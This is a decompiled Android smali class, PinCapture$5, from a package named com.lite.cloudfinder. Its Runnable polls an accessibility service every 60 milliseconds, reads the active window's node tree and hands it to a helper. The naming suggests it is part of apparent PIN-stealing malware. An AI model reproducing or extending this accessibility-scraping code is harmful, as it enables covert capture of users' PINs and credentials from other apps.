.class Lcom/lite/cloudfinder/pin/PinCapture$5;
.super Ljava/lang/Object;
.source "PinCapture.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/lite/cloudfinder/pin/PinCapture;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .line 418
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 421
    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->access$600()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    .line 423
    :cond_0
    :try_start_0
    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->access$700()Landroid/accessibilityservice/AccessibilityService;

    move-result-object v0

    if-eqz v0, :cond_1

    .line 425
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    const/4 v1, 0x0

    .line 427
    invoke-static {v0, v1}, Lcom/lite/cloudfinder/pin/PinCapture;->access$800(Landroid/view/accessibility/AccessibilityNodeInfo;I)V

    .line 428
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 433
    :catchall_0
    :cond_1
    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->access$600()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->access$900()Landroid/os/Handler;

    move-result-object v0

    const-wide/16 v1, 0x3c

    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_2
    return-void
.end method
